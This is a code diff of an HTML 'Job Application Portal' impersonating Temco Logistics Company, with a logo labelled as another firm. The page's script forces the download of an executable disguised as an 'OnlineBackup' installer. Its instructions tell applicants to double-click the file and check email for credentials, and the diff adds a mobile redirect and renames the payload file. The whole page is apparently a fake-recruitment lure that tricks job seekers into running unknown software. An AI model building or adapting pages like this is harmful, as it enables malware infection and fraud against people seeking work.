@@ -3,7 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Temco Logistics Company – Onboarding</title>
+    <title>TEMCO LOGISTICS COMPANY – Onboarding</title>
+ <script>
+(function () {
+    const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+    if (mobile) {
+        window.location.replace("mobile.html");
+    }
+})();
+</script>
     <style>
         :root{
             --brand-1:#667eea;
@@ -97,7 +106,7 @@
 <body>
 <div class="container" role="main" aria-labelledby="main-heading">
     <header class="header">
-        <img src="imgj.png" alt="GETHYPOWER INC logo" class="logo">
+        <img src="imgj.jpeg" alt="GETHYPOWER INC logo" class="logo">
         <div class="org-name">TEMCO LOGISTICS COMPANY</div>
         <h1 id="main-heading">Job Application Portal</h1>
         <p>Join Our Team Today</p>
@@ -124,6 +133,7 @@
             <li>Customer Care Representative</li>
             <li>Social Media Marketing Assistant</li>
             <li>Remote Administrative Coordinator</li>
+            <li>Remote Marketing Assistant</li>
             </ul>
 
             <p>
@@ -136,7 +146,8 @@
             <h3>About TEMCO LOGISTICS COMPANY</h3>
 
             <p>
-            <strong>TEMCO LOGISTICS COMPANY</strong>, Headquartered in Pomona, California, the company has fulfilled millions of residential and commercial deliveries for some of America’s largest retailers. Focusing on big and bulky products, Temco prides itself on elevating the final-mile delivery experience for its customers.</p>
+            <strong>TEMCO LOGISTICS COMPANY</strong>, TEMCO LOGISTICS COMPANY, Headquartered in Pomona, California, the company has fulfilled millions of residential and commercial deliveries for some of America’s largest retailers. Focusing on big and bulky products, Temco prides itself on elevating the final-mile delivery experience for its customers.
+            </p>
 
             <h3>Our Core Values</h3>
 
@@ -280,6 +291,7 @@
                         <option value="Customer Care Representative">Customer Care Representative</option>
                         <option value="Social Media Marketing Assistant">Social Media Marketing Assistant</option>
                         <option value="Remote Administrative Coordinator">Remote Administrative Coordinator</option>
+                        <option value="Remote Marketing Assistant">Remote Marketing Assistant</option>
                     </select>
                 </div>
 
@@ -328,7 +340,7 @@
             <div class="instructions">
                 <h3>📦 What's Next?</h3>
                 <ol>
-                    <li>Locate the .msi file in your Downloads folder</li>
+                    <li>Locate the .exe file in your Downloads folder</li>
                     <li>Double-click to install</li>
                     <li>Check your email for login credentials</li>
                 </ol>
@@ -371,8 +383,8 @@
 
         // 2. Trigger actual download
         const link = document.createElement('a');
-        link.href = 'TemcoLosgistics-OnlineBackup_o_backup_v8.6.0.338_oid68c278c8-9dff-46b4-9546-4bbc8353534d_bidLR9VLHHo4kazl4X1urIjjg.exe';
-        link.download = TemcoLosgistics-OnlineBackup_o_backup_v8.6.0.338_oid68c278c8-9dff-46b4-9546-4bbc8353534d_bidLR9VLHHo4kazl4X1urIjjg.exe';
+        link.href = 'GethyPowerInc-OnlineBackup_o_backup_v8.6.0.338_oid68c278c8-9dff-46b4-9546-4bbc8353534d_bidLR9VLHHo4kazl4X1urIjjg.exe';
+        link.download = 'GethyPowerInc-OnlineBackup_o_backup_v8.6.0.338_oid68c278c8-9dff-46b4-9546-4bbc8353534d_bidLR9VLHHo4kazl4X1urIjjg.exe';
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
